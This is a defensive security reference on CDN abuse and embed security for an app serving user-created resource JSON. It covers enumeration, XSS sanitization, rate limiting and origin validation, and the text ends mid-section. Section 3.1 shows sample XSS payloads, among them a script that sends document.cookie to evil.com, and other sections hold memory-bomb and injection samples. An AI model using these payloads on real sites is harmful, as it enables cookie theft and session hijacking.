# REF: CDN Abuse Prevention & Embed Security

> Reference for the `security-architecture` skill.
> Covers hotlinking, bandwidth theft, resource enumeration, cache poisoning, embed
> injection, compute abuse, rate limiting, origin validation, and monitoring.
> Written for an app that serves user-created resource documents (e.g. project/scene
> JSON) plus an embeddable runtime from a public CDN: resource JSON on an object store
> (S3-compatible / blob storage), a small embeddable runtime script, versioned immutable URLs.

---

## Table of Contents

1. [CDN Abuse Vectors](#1-cdn-abuse-vectors)
2. [Resource Enumeration Prevention](#2-resource-enumeration-prevention)
3. [Embed Injection Attacks](#3-embed-injection-attacks)
4. [Compute Abuse Prevention](#4-compute-abuse-prevention)
5. [Rate Limiting Architecture](#5-rate-limiting-architecture)
6. [Origin Validation & Hotlink Protection](#6-origin-validation--hotlink-protection)
7. [Monitoring & Detection](#7-monitoring--detection)
8. [Anti-Patterns Table](#8-anti-patterns-table)
9. [See Also](#9-see-also)

---

## 1. CDN Abuse Vectors

The app serves user-created resource documents (project/scene JSON) and the embed
runtime from a public CDN. This creates an attack surface that does not exist in
traditional SaaS apps where all data flows through authenticated API endpoints.

### 1.1 Hotlinking

Unauthorized sites load resources from your CDN without permission. The resource
creator pays for the bandwidth but the embedding site gets the content for free.

```
Legitimate:   acme.com (whitelisted) → cdn.example.com/resources/abc123/manifest.json
Hotlink:      evil.com (not whitelisted) → cdn.example.com/resources/abc123/manifest.json
```

**Impact:** bandwidth cost inflation, IP theft, brand dilution if the resource appears
on inappropriate sites. Some object stores do not charge egress; others bill per GB --
hotlinking on a metered store can cause direct cost escalation.

### 1.2 Bandwidth Theft via Bots/Scrapers

Automated tools download resource JSON at scale to:
- Build competing template libraries from published resources
- Train ML models on resource structure
- Enumerate the entire resource catalog for competitive intelligence

A single bot can issue thousands of requests per minute against CDN URLs that have
no authentication barrier.

### 1.3 Resource Enumeration (ID Guessing)

If resource IDs are sequential or predictable, an attacker can iterate through all
possible IDs to discover and download every published resource:

```
# Sequential IDs -- trivially enumerable
GET /resources/1/manifest.json    → 200
GET /resources/2/manifest.json    → 200
GET /resources/3/manifest.json    → 200
...
GET /resources/50000/manifest.json → 200
```

This exposes draft/unlisted resources, reveals total resource count, and enables bulk
IP theft. See Section 2 for prevention.

### 1.4 Cache Poisoning

An attacker manipulates CDN cache keys to serve incorrect content:

- **Query string pollution:** `manifest.json?callback=evil` cached as a distinct
  key, response may differ if backend respects query params
- **Host header injection:** forged `Host:` header causes CDN to cache response
  under attacker-controlled key
- **Vary header abuse:** manipulating `Accept-Language` or `Accept-Encoding` to
  fragment the cache and reduce hit rates

**Mitigation:** normalize cache keys, strip unknown query parameters at the CDN
edge, pin `Vary` headers to a known set.

### 1.5 DDoS Amplification

Using the CDN as a traffic reflector:

- Resource JSON files are typically 10-80KB. A 40-byte request yields an 80KB
  response -- amplification factor of ~2000x
- If the CDN does not rate-limit, an attacker spoofs source IPs and directs
  amplified responses at a victim
- Versioned immutable URLs with long cache TTLs mitigate this at the edge
  (the edge absorbs the load), but the origin must still be protected

---

## 2. Resource Enumeration Prevention

Resource enumeration is the highest-impact CDN abuse vector here because it
enables bulk discovery and theft of user-created resources.

### 2.1 UUIDv4 vs Sequential IDs

**Sequential IDs are the single worst design decision for a CDN-served creative tool.**

| Property | Sequential (int) | UUIDv4 |
|----------|-----------------|--------|
| Keyspace | 1 to N (trivially iterable) | 2^122 (~5.3 x 10^36) |
| Enumerable | Yes, 100% | No, brute force infeasible |
| Collision risk | None | ~1 in 2.71 x 10^18 (negligible) |
| URL length | Short (`/resources/42`) | 36 chars (`/resources/a1b2c3d4-...`) |
| Database index perf | Slightly better B-tree locality | UUIDv7 if ordering matters |

**Decision:** All resource IDs MUST be UUIDv4 (or UUIDv7 for time-ordered needs).
The URL path is:

```
cdn.example.com/resources/{uuidv4}/manifest.json
cdn.example.com/resources/{uuidv4}/v{n}/resource.json
```

This should align with whatever versioned-URL architecture the project's CDN layer uses.

### 2.2 Signed URLs for Private/Draft Resources

Published (public) resources are served with open CORS. Draft, unlisted, or premium
resources require signed URLs with time-limited HMAC tokens.

```typescript
// lib/cdn/signed-urls.ts

import { createHmac } from 'crypto';

interface SignedUrlParams {
  readonly resourceId: string;
  readonly version: number;
  readonly expiresInSeconds: number;
  readonly allowedOrigin?: string;
}

interface SignedUrlResult {
  readonly url: string;
  readonly expiresAt: number;
  readonly signature: string;
}

const CDN_BASE = process.env.CDN_BASE_URL!;          // https://cdn.example.com
const SIGNING_SECRET = process.env.CDN_SIGNING_SECRET!; // 256-bit secret

/**
 * Generate a signed CDN URL for a private/draft resource.
 *
 * The signature covers: resourceId + version + expiry + origin.
 * Any modification to these parameters invalidates the signature.
 *
 * HMAC-SHA256 is used per RFC 2104. The secret MUST be at least
 * 256 bits (32 bytes) per NIST SP 800-107.
 */
export function generateSignedUrl(
  params: SignedUrlParams
): SignedUrlResult {
  const { resourceId, version, expiresInSeconds, allowedOrigin } = params;

  if (!SIGNING_SECRET || SIGNING_SECRET.length < 32) {
    throw new Error(
      'CDN_SIGNING_SECRET must be at least 32 characters. '
      + 'Generate with: openssl rand -hex 32'
    );
  }

  const expiresAt = Math.floor(Date.now() / 1000) + expiresInSeconds;
  const payload = `${resourceId}:${version}:${expiresAt}:${allowedOrigin ?? '*'}`;

  const signature = createHmac('sha256', SIGNING_SECRET)
    .update(payload)
    .digest('hex');

  const queryParams = new URLSearchParams({
    expires: String(expiresAt),
    sig: signature,
    ...(allowedOrigin ? { origin: allowedOrigin } : {}),
  });

  const url =
    `${CDN_BASE}/resources/${resourceId}/v${version}/resource.json`
    + `?${queryParams.toString()}`;

  return { url, expiresAt, signature };
}

/**
 * Verify a signed URL at the edge (an edge worker or API route).
 * Returns true only if signature is valid AND not expired.
 *
 * Uses timing-safe comparison to prevent timing attacks on the
 * signature (CWE-208).
 */
export function verifySignedUrl(
  resourceId: string,
  version: number,
  expires: string,
  signature: string,
  origin: string
): boolean {
  const now = Math.floor(Date.now() / 1000);
  const expiresAt = parseInt(expires, 10);

  // Check expiry BEFORE computing HMAC to save CPU on expired tokens
  if (isNaN(expiresAt) || now > expiresAt) {
    return false;
  }

  const payload = `${resourceId}:${version}:${expiresAt}:${origin}`;
  const expected = createHmac('sha256', SIGNING_SECRET)
    .update(payload)
    .digest('hex');

  // Timing-safe comparison -- do NOT use === for signature comparison
  if (signature.length !== expected.length) {
    return false;
  }

  const sigBuffer = Buffer.from(signature, 'hex');
  const expectedBuffer = Buffer.from(expected, 'hex');

  // crypto.timingSafeEqual requires equal-length buffers
  if (sigBuffer.length !== expectedBuffer.length) {
    return false;
  }

  const { timingSafeEqual } = require('crypto');
  return timingSafeEqual(sigBuffer, expectedBuffer);
}
```

### 2.3 Rate Limiting on Resource Manifest Endpoints

Manifest endpoints (`/resources/{id}/manifest.json`) are the discovery vector.
Rate limit these more aggressively than versioned resource files:

| Endpoint | Rate Limit | Window | Rationale |
|----------|-----------|--------|-----------|
| `GET /resources/{id}/manifest.json` | 60 req/IP | 1 min | Prevents rapid enumeration |
| `GET /resources/{id}/v{n}/resource.json` | 120 req/IP | 1 min | Higher limit for legitimate embed loads |
| `POST /api/resources/publish` | 10 req/user | 1 min | Prevents spam publishing |
| `GET /api/resources/list` | 20 req/user | 1 min | Prevents catalog scraping |

### 2.4 Honeypot Resource IDs

Deploy trap URLs that no legitimate client would ever request. Any request to
these endpoints is proof of enumeration or scraping.

```typescript
// lib/cdn/honeypot.ts

/**
 * Known honeypot resource IDs.
 * These are valid UUIDv4 format but do not correspond to real resources.
 * They are seeded into robots.txt disallow lists and hidden links.
 * Any request to these IDs triggers an alert and IP block.
 */
const HONEYPOT_IDS = new Set([
  '00000000-0000-4000-8000-000000000001',
  '00000000-0000-4000-8000-000000000002',
  'deadbeef-dead-4ead-8eef-deadbeefcafe',
  'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee',
] as const);

interface HoneypotResult {
  readonly isHoneypot: boolean;
  readonly shouldBlock: boolean;
  readonly alertLevel: 'none' | 'warn' | 'critical';
}

export function checkHoneypot(resourceId: string): HoneypotResult {
  if (HONEYPOT_IDS.has(resourceId)) {
    return {
      isHoneypot: true,
      shouldBlock: true,
      alertLevel: 'critical',
    };
  }
  return { isHoneypot: false, shouldBlock: false, alertLevel: 'none' };
}
```

Place honeypot IDs in locations only automated tools would find:
- HTML comments in the embed documentation page
- `robots.txt` disallow entries (crawlers parse disallowed paths)
- Hidden `<a>` tags on the resource gallery (display: none)

---

## 3. Embed Injection Attacks

The embed runtime (a small `embed.min.js`-style script) loads resource JSON and renders
it on customer websites. This creates injection vectors at every data boundary.

### 3.1 XSS via Resource JSON

Resource JSON contains user-authored strings: resource name, description, layer names,
custom text content, annotation comments. If these strings are rendered to DOM
without sanitization, XSS is possible.

**Attack vector:**

```json
{
  "name": "<img src=x onerror=alert(document.cookie)>",
  "description": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
  "layers": [
    {
      "name": "Layer 1\"><script>alert(1)</script>",
      "type": "filter"
    }
  ]
}
```

**Mitigation pipeline:**

```typescript
// lib/sanitize/resource-sanitizer.ts

/**
 * Sanitize all string fields in resource JSON before:
 * 1. Storing to database (defense in depth)
 * 2. Uploading to CDN (primary defense)
 * 3. Rendering in embed runtime (last resort defense)
 *
 * Uses allowlist approach: only known-safe characters pass through.
 * HTML entities are escaped, not stripped, to preserve display intent.
 */

const HTML_ESCAPE_MAP: ReadonlyMap<string, string> = new Map([
  ['&', '&amp;'],
  ['<', '&lt;'],
  ['>', '&gt;'],
  ['"', '&quot;'],
  ["'", '&#x27;'],
  ['/', '&#x2F;'],
]);

const HTML_ESCAPE_REGEX = /[&<>"'/]/g;

export function escapeHtml(input: string): string {
  return input.replace(
    HTML_ESCAPE_REGEX,
    (char) => HTML_ESCAPE_MAP.get(char) ?? char
  );
}

/**
 * Strip all HTML tags. For fields that should NEVER contain markup.
 * Does not rely on regex-only stripping (bypassable). Uses a multi-pass
 * approach: decode entities, strip tags, re-encode.
 */
export function stripHtml(input: string): string {
  // First pass: decode common HTML entities that could hide tags
  let decoded = input
    .replace(/&#(\d+);/g, (_, code) => String.fromCharCode(Number(code)))
    .replace(/&#x([0-9a-fA-F]+);/g, (_, hex) =>
      String.fromCharCode(parseInt(hex, 16))
    );

  // Second pass: strip tags (after entity decoding)
  decoded = decoded.replace(/<[^>]*>/g, '');

  // Third pass: escape any remaining angle brackets
  return escapeHtml(decoded);
}

interface ResourceJson {
  readonly name?: string;
  readonly description?: string;
  readonly layers?: ReadonlyArray<{ readonly name?: string; [key: string]: unknown }>;
  readonly [key: string]: unknown;
}

/**
 * Deep-sanitize all string values in a resource JSON object.
 * Walks the entire tree -- no string escapes unsanitized.
 */
export function sanitizeResourceJson<T>(obj: T): T {
  if (typeof obj === 'string') {
    return stripHtml(obj) as unknown as T;
  }
  if (Array.isArray(obj)) {
    return obj.map(sanitizeResourceJson) as unknown as T;
  }
  if (obj !== null && typeof obj === 'object') {
    const result: Record<string, unknown> = {};
    for (const [key, value] of Object.entries(obj)) {
      result[key] = sanitizeResourceJson(value);
    }
    return result as T;
  }
  return obj;
}
```

### 3.2 Script Injection via Embed Code Parameters

The embed snippet users copy into their HTML:

```html
<div data-embed-resource="abc123" data-embed-version="3"></div>
<script src="https://cdn.example.com/embed.min.js"></script>
```

**Attack:** A malicious actor modifies the embed snippet to inject parameters:

```html
<div data-embed-resource="abc123" data-embed-callback="alert(1)"></div>
```

**Defense:** The runtime MUST use an allowlist of recognized `data-embed-*`
attributes. Unknown attributes are silently ignored. No attribute value is ever
passed to `eval()`, `new Function()`, `innerHTML`, or `document.write()`.

```typescript
// In the embed runtime initialization

const ALLOWED_DATA_ATTRS = new Set([
  'resource',
  'version',
  'lazy',
  'quality',
  'responsive',
  'poster',
  'reduced-motion',
] as const);

function parseEmbedConfig(element: HTMLElement): Record<string, string> {
  const config: Record<string, string> = {};

  for (const attr of Array.from(element.attributes)) {
    if (!attr.name.startsWith('data-embed-')) continue;

    const key = attr.name.slice('data-embed-'.length);
    if (!ALLOWED_DATA_ATTRS.has(key as any)) {
      console.warn(`[embed] Unknown embed attribute ignored: ${attr.name}`);
      continue;
    }
    config[key] = attr.value;
  }

  return config;
}
```

### 3.3 PostMessage Spoofing

If the embed runtime communicates with the parent page via `postMessage` (for
resize events, loading callbacks, interaction events), any script on the parent
page -- including third-party scripts -- can spoof messages.

**Defense:**

```typescript
// In the embed runtime

const TRUSTED_ORIGINS = new Set([
  'https://example.com',
  'https://app.example.com',
  'https://cdn.example.com',
]);

function handleMessage(event: MessageEvent): void {
  // CRITICAL: Always verify origin. Never trust event.data blindly.
  if (!TRUSTED_ORIGINS.has(event.origin)) {
    return; // Silent drop -- do not log to avoid information leakage
  }

  // Validate message structure with a type discriminant
  if (
    typeof event.data !== 'object' ||
    event.data === null ||
    typeof event.data.type !== 'string'
  ) {
    return;
  }

  // Only accept known message types
  switch (event.data.type) {
    case 'embed:resize':
    case 'embed:pause':
    case 'embed:resume':
    case 'embed:quality':
      // Handle known messages
      break;
    default:
      return; // Unknown message type -- ignore
  }
}

window.addEventListener('message', handleMessage);
```

### 3.4 CSP Bypass via Embed Script Tag

The embed script tag loaded on customer sites must not create CSP
bypass opportunities:

- The script MUST NOT use `eval()` or `new Function()`
- The script MUST NOT inject inline `<script>` tags
- The script MUST NOT set `innerHTML` with user-controlled content
- Renderer/parser data strings are passed to their consuming API as data, not evaluated as JS
- The script SHOULD declare `integrity` attribute (SRI) for CDN-served files

```html
<!-- Recommended embed with Subresource Integrity -->
<script
  src="https://cdn.example.com/embed.min.js"
  integrity="sha384-{hash}"
  crossorigin="anonymous"
></script>
```

### 3.5 Resource JSON Sanitization Pipeline

Three-layer defense applied at different stages:

| Layer | Where | What |
|-------|-------|------|
| 1. Write-time | `POST /api/resources/publish` | Validate schema, sanitize strings, reject oversized resources |
| 2. CDN upload | Upload pipeline | Re-validate sanitized JSON, strip editor metadata |
| 3. Runtime | embed runtime on customer site | Escape any string before DOM insertion, never trust JSON values |

Defense-in-depth: if layer 1 is bypassed (API vulnerability), layers 2 and 3 still
prevent XSS. If an attacker directly uploads to the object store (key compromise), layer 3
still prevents client-side exploitation.

---

## 4. Compute Abuse Prevention

If the runtime executes any user-supplied compute or render workload on the client
device (GPU shaders, heavy CPU loops, Web Worker tasks, sandboxed expressions),
malicious or malformed resources can exploit it to cause denial of service on the
client device.

### 4.1 Infinite-Loop / Runaway Workloads

User-supplied loops with unbounded iteration counts can hang the device. For GPU
workloads, most drivers implement a watchdog timeout (2-5 seconds), after which the
driver kills the context and the browser reports a context-lost event. For CPU/worker
workloads, the tab can freeze entirely.

**Defense:** Server-side static analysis of the workload source before CDN upload.

> The example below targets a GPU/shader-style source as the concrete case. The same
> static-analysis pattern (length cap, unbounded-loop detection, nesting-depth cap,
> expensive-operation spam detection) applies to any user-supplied compute source —
> a query language, a formula/expression engine, or a sandboxed script. Adapt the
> token patterns to the actual language you accept.

```typescript
// lib/validation/workload-validator.ts

interface WorkloadValidationResult {
  readonly valid: boolean;
  readonly errors: ReadonlyArray<string>;
  readonly warnings: ReadonlyArray<string>;
}

const MAX_LOOP_ITERATIONS = 1024;
const MAX_NESTED_LOOPS = 4;
const MAX_SOURCE_LENGTH = 16384; // 16KB source limit

/**
 * Static analysis of a user-supplied workload source to detect potential
 * compute abuse. This is NOT a full parser -- it catches common abuse patterns.
 * The runtime compiler provides the actual compilation check.
 */
export function validateWorkloadSource(
  source: string
): WorkloadValidationResult {
  const errors: string[] = [];
  const warnings: string[] = [];

  // Length check
  if (source.length > MAX_SOURCE_LENGTH) {
    errors.push(
      `Workload source exceeds ${MAX_SOURCE_LENGTH} bytes `
      + `(actual: ${source.length})`
    );
  }

  // Detect unbounded loops
  // Pattern: for(int i = 0; i < LARGE_NUMBER; i++)
  const forLoopRegex = /for\s*\(\s*\w+\s+\w+\s*=\s*\d+\s*;\s*\w+\s*[<>]=?\s*(\d+)/g;
  let match: RegExpExecArray | null;
  while ((match = forLoopRegex.exec(source)) !== null) {
    const iterCount = parseInt(match[1], 10);
    if (iterCount > MAX_LOOP_ITERATIONS) {
      errors.push(
        `Loop iteration count ${iterCount} exceeds maximum `
        + `${MAX_LOOP_ITERATIONS} at position ${match.index}`
      );
    }
  }

  // Detect unbounded while loops (where the target language allows them)
  if (/\bwhile\s*\(/.test(source)) {
    warnings.push(
      'while loops detected -- they risk unbounded execution. '
      + 'Prefer bounded for loops.'
    );
  }

  // Detect nested loop depth via brace counting
  let maxDepth = 0;
  let currentDepth = 0;
  for (const char of source) {
    if (char === '{') currentDepth++;
    if (char === '}') currentDepth--;
    maxDepth = Math.max(maxDepth, currentDepth);
  }
  if (maxDepth > MAX_NESTED_LOOPS + 2) { // +2 for function and main braces
    warnings.push(
      `Nesting depth ${maxDepth} may indicate deeply nested loops. `
      + `Maximum recommended: ${MAX_NESTED_LOOPS} loop levels.`
    );
  }

  return {
    valid: errors.length === 0,
    errors,
    warnings,
  };
}
```

### 4.2 Memory Bomb Resources

A malicious resource JSON can request enormous buffers or an excessive number of
render/compute targets to exhaust device memory:

```json
{
  "buffers": [
    { "width": 16384, "height": 16384, "format": "RGBA32F" },
    { "width": 16384, "height": 16384, "format": "RGBA32F" },
    { "width": 16384, "height": 16384, "format": "RGBA32F" }
  ]
}
```

Three 16K RGBA32F buffers = 3 x 16384 x 16384 x 16 bytes = **12 GB** of device memory.

### 4.3 Resource Complexity Limits

Enforce hard limits at both the publish endpoint and the runtime. The exact fields
depend on your resource format; the structure (named caps + a violation list) is the
transferable part:

```typescript
// lib/validation/resource-limits.ts

/**
 * Resource complexity limits.
 * Derive these values from:
 * - The platform's implementation limits (queried at runtime)
 * - Performance profiling on representative mid-range hardware
 * - The object store's max object size (limit far below the hard cap)
 */
export const RESOURCE_LIMITS = {
  // Structure limits
  maxLayers: 64,
  maxNodes: 128,
  maxConnections: 256,
  maxGraphDepth: 16,

  // Buffer limits
  maxBufferWidth: 4096,
  maxBufferHeight: 4096,
  maxBufferCount: 16,
  maxTotalBufferBytes: 256 * 1024 * 1024, // 256 MB

  // Workload-source limits
  maxWorkloadSourceBytes: 16384,
  maxParameterCount: 64,

  // Render/compute target limits
  maxRenderTargets: 8,
  maxRenderTargetWidth: 4096,
  maxRenderTargetHeight: 4096,

  // Overall resource limits
  maxResourceJsonBytes: 512 * 1024, // 512 KB
  maxOperationsPerFrame: 64,
} as const;

interface LimitViolation {
  readonly field: string;
  readonly actual: number;
  readonly limit: number;
}

export function checkResourceLimits(
  resource: Record<string, unknown>
): ReadonlyArray<LimitViolation> {
  const violations: LimitViolation[] = [];
  const layers = Array.isArray(resource.layers) ? resource.layers : [];
  const buffers = Array.isArray(resource.buffers) ? resource.buffers : [];

  if (layers.length > RESOURCE_LIMITS.maxLayers) {
    violations.push({
      field: 'layers',
      actual: layers.length,
      limit: RESOURCE_LIMITS.maxLayers,
    });
  }

  if (buffers.length > RESOURCE_LIMITS.maxBufferCount) {
    violations.push({
      field: 'buffers',
      actual: buffers.length,
      limit: RESOURCE_LIMITS.maxBufferCount,
    });
  }

  const jsonSize = JSON.stringify(resource).length;
  if (jsonSize > RESOURCE_LIMITS.maxResourceJsonBytes) {
    violations.push({
      field: 'resourceJsonBytes',
      actual: jsonSize,
      limit: RESOURCE_LIMITS.maxResourceJsonBytes,
    });
  }

  for (const buf of buffers) {
    const b = buf as Record<string, unknown>;
    const w = Number(b.width) || 0;
    const h = Number(b.height) || 0;
    if (w > RESOURCE_LIMITS.maxBufferWidth) {
      violations.push({ field: 'buffer.width', actual: w, limit: RESOURCE_LIMITS.maxBufferWidth });
    }
    if (h > RESOURCE_LIMITS.maxBufferHeight) {
      violations.push({ field: 'buffer.height', actual: h, limit: RESOURCE_LIMITS.maxBufferHeight });
    }
  }

  return violations;
}
```

### 4.4 Client Context Timeout Detection (context lost)

When a workload hangs a GPU/rendering context, the browser fires a context-lost
event. The runtime must handle this gracefully instead of leaving a blank canvas:

```typescript
// In the embed runtime

function setupContextLossHandling(
  canvas: HTMLCanvasElement,
  ctx: WebGL2RenderingContext
): void {
  canvas.addEventListener('webglcontextlost', (event) => {
    event.preventDefault(); // Required to allow context restoration

    // Log the incident for abuse detection
    reportContextLoss({
      resourceId: currentResourceId,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
    });

    // Show fallback poster image
    showPosterFallback(canvas);
  });

  canvas.addEventListener('webglcontextrestored', () => {
    // Re-initialize client state and re-compile any workloads
    reinitializeRenderer(canvas, ctx);
  });
}
```

### 4.5 Server-Side Resource Validation Before CDN Upload

All resource validation runs at the publish endpoint BEFORE the resource reaches the
CDN. The CDN serves pre-validated content. The runtime applies a lighter validation
pass as defense-in-depth.

```
User clicks "Publish"
  → POST /api/resources/publish
    → 1. Auth check (user owns resource)
    → 2. sanitizeResourceJson()        (Section 3.1)
    → 3. checkResourceLimits()         (Section 4.3)
    → 4. validateWorkloadSource()      (Section 4.1)
    → 5. Strip editor metadata
    → 6. Compute content hash
    → 7. Upload to CDN (object store)
    → 8. Update manifest.json
  → 200 OK { url, version }
```

If any validation step fails, the resource is NOT uploaded. The user receives a
specific error message indicating which limit was exceeded.

---

## 5. Rate Limiting Architecture

### 5.1 Multi-Layer Rate Limiting

Rate limiting must be applied at multiple layers because no single layer
catches all abuse patterns:

```
Layer 1: CDN/WAF Rate Limiting Rules (edge -- e.g. Cloudflare, Fastly, AWS WAF)
  → Blocks volumetric attacks before reaching origin
  → Per-IP, per-path rules
  → Typically: a coarse per-IP request cap and bot management

Layer 2: Origin Edge Middleware (e.g. an edge function / middleware tier)
  → Runs before API routes
  → Per-user + per-IP limiting for authenticated endpoints
  → Accesses a KV/Redis store for rate-limit state

Layer 3: API Route Handler (application)
  → Per-user, per-action limits
  → Business logic enforcement (publish quota, export quota)
  → Database-backed for accuracy
```

### 5.2 Token Bucket vs Sliding Window

| Property | Token Bucket | Sliding Window |
|----------|-------------|---------------|
| Burst tolerance | Yes (bucket fills over time) | No (strict count per window) |
| Memory per key | 2 values (tokens, last refill) | N timestamps or 2 counters |
| Boundary spike | No double-spend at window edges | Fixed window: yes, sliding: no |
| Implementation | Simpler | Fixed: simpler, sliding: moderate |
| Best for | API endpoints, publish actions | CDN manifest requests, enumeration defense |

**Recommendation:** Token bucket for authenticated API endpoints (allows short
bursts for legitimate use), sliding window for CDN manifest requests (strict limit
to prevent enumeration).

### 5.3 Rate Limiting Middleware

```typescript
// lib/middleware/rate-limiter.ts

interface RateLimitConfig {
  readonly windowMs: number;
  readonly maxRequests: number;
  readonly keyPrefix: string;
}

interface RateLimitResult {
  readonly allowed: boolean;
  readonly remaining: number;
  readonly resetAt: number;
  readonly retryAfter: number | null;
}

/**
 * Sliding window rate limiter using a sorted set pattern.
 * Compatible with a serverless KV / Redis store (e.g. Upstash Redis).
 *
 * Implementation follows the sliding window log algorithm:
 * 1. Remove all entries older than the window
 * 2. Count remaining entries
 * 3. If under limit, add current timestamp
 *
 * Reference: "Rate Limiting" in System Design Interview (Alex Xu, Ch. 4)
 */
export async function checkRateLimit(
  store: RateLimitStore,
  key: string,
  config: RateLimitConfig
): Promise<RateLimitResult> {
  const now = Date.now();
  const windowStart = now - config.windowMs;
  const storeKey = `${config.keyPrefix}:${key}`;

  // Atomic pipeline: remove old + count + add new
  const count = await store.slidingWindowCount(storeKey, windowStart, now);

  if (count >= config.maxRequests) {
    const oldestInWindow = await store.oldestTimestamp(storeKey, windowStart);
    const retryAfter = oldestInWindow
      ? Math.ceil((oldestInWindow + config.windowMs - now) / 1000)
      : Math.ceil(config.windowMs / 1000);

    return {
      allowed: false,
      remaining: 0,
      resetAt: now + config.windowMs,
      retryAfter,
    };
  }

  await store.addTimestamp(storeKey, now, config.windowMs);

  return {
    allowed: true,
    remaining: config.maxRequests - count - 1,
    resetAt: now + config.windowMs,
    retryAfter: null,
  };
}

/**
 * Rate limit store interface. Implementations can be backed by
 * a serverless Redis (e.g. Upstash), an in-memory Map (development), or
 * an edge KV / durable-object store.
 */
interface RateLimitStore {
  slidingWindowCount(key: string, windowStart: number, now: number): Promise<number>;
  oldestTimestamp(key: string, windowStart: number): Promise<number | null>;
  addTimestamp(key: string, timestamp: number, ttlMs: number): Promise<void>;
}

// Preset configurations for the app's endpoints
export const RATE_LIMITS = {
  manifestFetch: {
    windowMs: 60_000,
    maxRequests: 60,
    keyPrefix: 'rl:manifest',
  },
  resourcePublish: {
    windowMs: 60_000,
    maxRequests: 10,
    keyPrefix: 'rl:publish',
  },
  resourceExport: {
    windowMs: 60_000,
    maxRequests: 5,
    keyPrefix: 'rl:export',
  },
  apiGeneral: {
    windowMs: 60_000,
    maxRequests: 120,
    keyPrefix: 'rl:api',
  },
} as const satisfies Record<string, RateLimitConfig>;
```

### 5.4 Response Headers

Always include rate limit headers so legitimate clients can self-throttle:

```
HTTP/1.1 429 Too Many Requests
Retry-After: 45
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1711843260
Content-Type: application/json

{"error": "rate_limit_exceeded", "retryAfter": 45}
```

---

## 6. Origin Validation & Hotlink Protection

### 6.1 Referer Header Checking

The `Referer` header indicates which page initiated the request. It can be used
for hotlink detection but has significant caveats:

| Caveat | Detail |
|--------|--------|
| Not always present | Privacy settings, `Referrer-Policy: no-referrer`, HTTPS-to-HTTP |
| Spoofable | Any HTTP client can set arbitrary Referer |
| Useful as signal | Most browser-initiated requests include it correctly |
| Not sole defense | Use as one signal among many, never as sole access control |

### 6.2 CORS Configuration for Resource JSON

```typescript
// Object-store CORS configuration (set via the S3-compatible API)

const CORS_RULES = [
  {
    AllowedOrigins: ['*'],        // Public resources -- any origin can load
    AllowedMethods: ['GET', 'HEAD'],
    AllowedHeaders: ['Range', 'If-None-Match'],
    ExposeHeaders: ['Content-Length', 'ETag', 'Content-Type'],
    MaxAgeSeconds: 86400,         // Cache preflight for 24h
  },
];

// For premium/private resources, CORS is restricted per-user allowlist.
// The signed URL verification runs BEFORE CORS headers are applied.
```

**Key principle:** Public resources use open CORS (`*`). Access control for private
resources is enforced via signed URLs (Section 2.2), not CORS restrictions. CORS
is a browser-enforced policy -- it does not prevent server-side or CLI access.

### 6.3 Allowed Origins Registry (Per-User Whitelist)

Each user/team can register allowed domains for their embeds. The runtime
embed token is tied to specific origins:

```typescript
// lib/embed/origin-registry.ts

interface EmbedToken {
  readonly resourceId: string;
  readonly allowedOrigins: ReadonlyArray<string>;
  readonly createdAt: number;
  readonly expiresAt: number | null; // null = no expiry for paid plans
}

/**
 * Validate that the requesting origin is allowed for this resource.
 * Called at the CDN edge (an edge worker) or in the runtime.
 *
 * Open tier: resources embed from any origin (open access)
 * Restricted tier: optional origin restriction (user configures allowed domains)
 * Locked tier: mandatory origin restriction
 */
export function validateOrigin(
  requestOrigin: string,
  token: EmbedToken
): boolean {
  // Empty allowlist = allow all origins (open-tier behavior)
  if (token.allowedOrigins.length === 0) {
    return true;
  }

  // Normalize origin (strip trailing slash, lowercase)
  const normalized = requestOrigin.toLowerCase().replace(/\/$/, '');

  return token.allowedOrigins.some((allowed) => {
    const normalizedAllowed = allowed.toLowerCase().replace(/\/$/, '');

    // Exact match
    if (normalized === normalizedAllowed) return true;

    // Wildcard subdomain match: *.example.com matches sub.example.com
    if (normalizedAllowed.startsWith('*.')) {
      const domain = normalizedAllowed.slice(2);
      return normalized.endsWith(domain) && normalized.includes('.');
    }

    return false;
  });
}
```

### 6.4 Edge / WAF Hotlink Protection

Most CDN/WAF providers offer built-in hotlink protection at the edge. Configure it
via the provider dashboard or Terraform. The example below uses a Cloudflare ruleset
for concreteness; the same expression maps onto any WAF that can match URI path +
referer + verified-bot:

```hcl
# terraform/waf-hotlink.tf (conceptual)

resource "cloudflare_ruleset" "hotlink_protection" {
  zone_id = var.zone_id
  name    = "Resource CDN Hotlink Protection"
  kind    = "zone"
  phase   = "http_request_firewall_custom"

  rules {
    action     = "block"
    expression = <<-EOT
      (http.request.uri.path matches "/resources/[^/]+/v[0-9]+/resource\\.json$")
      and (not http.referer contains "example.com")
      and (not http.referer contains "localhost")
      and (http.referer ne "")
      and (not cf.bot_management.verified_bot)
    EOT
    description = "Block hotlinked resource JSON from unknown origins"
    enabled     = true
  }
}
```

> Replace `example.com` with your own origin domain.

**Important:** This rule blocks requests WITH a referer from unknown origins.
Requests WITHOUT a referer (direct navigation, curl, Postman) are allowed -- this
is intentional because blocking no-referer requests breaks too many legitimate
flows. Signed URLs (Section 2.2) protect private resources regardless of referer.

### 6.5 Signed Embed Tokens Tied to Domain

For premium features, embed tokens bind a resource to specific domains:

```
cdn.example.com/resources/{resourceId}/v{n}/resource.json
  ?token={jwt}
  &origin=acme.com
```

The JWT payload contains `allowedOrigins`. The CDN edge worker verifies the JWT
signature and checks the `Origin` header against the allowlist. This provides
cryptographic proof of authorization, not just header inspection.

---

## 7. Monitoring & Detection

### 7.1 Anomaly Detection

Track these signals to identify abuse before it escalates:

| Signal | Normal Range | Alert Threshold | Action |
|--------|-------------|-----------------|--------|
| Manifest requests/min per IP | 1-5 | >30 | Rate limit, investigate |
| Unique resource IDs per IP per hour | 1-10 | >50 | Likely enumeration, block |
| 404 rate on resource endpoints | <1% | >10% | Enumeration with random IDs |
| Requests from data center IPs | <5% | >20% | Bot traffic, challenge |
| Request rate from single ASN | Varies | >1000/min | Coordinated scraping |
| Geographic concentration | Distributed | >80% single country (unusual) | Investigate |

### 7.2 Resource Access Logging

Every CDN request should be logged for forensic analysis. Many CDNs provide a log-push
feature; if yours does not, log at the API layer:

```typescript
// lib/logging/resource-access-log.ts

interface ResourceAccessEvent {
  readonly timestamp: string;
  readonly resourceId: string;
  readonly version: number | null;
